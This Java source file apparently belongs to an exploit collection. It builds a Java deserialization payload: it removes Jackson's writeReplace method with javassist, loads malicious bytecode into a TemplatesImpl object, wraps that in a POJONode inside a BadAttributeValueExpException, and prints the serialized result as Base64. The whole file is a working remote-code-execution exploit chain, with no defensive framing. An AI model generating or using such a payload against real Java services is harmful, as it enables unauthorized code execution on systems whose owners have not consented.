package com.just.exp;

import com.fasterxml.jackson.databind.node.POJONode;
import com.just.util.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.util.Base64;

public class Exp01 {
    public static void main(String[] args) throws Exception {
        // 删除writeReplace方法
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        byte[] evilBytes = Utils.getEvilByte();
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setFieldValue(templates, "_name", "justdoit");
        Utils.setFieldValue(templates, "_bytecodes", new byte[][]{evilBytes});
        Utils.setFieldValue(templates, "_tfactory", null);

        POJONode node = new POJONode(templates);
        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
        Utils.setFieldValue(exception, "val", node);

        byte[] serialize = Utils.serialize(exception);
        String s = Base64.getEncoder().encodeToString(serialize);
        System.out.println(s);
    }
}
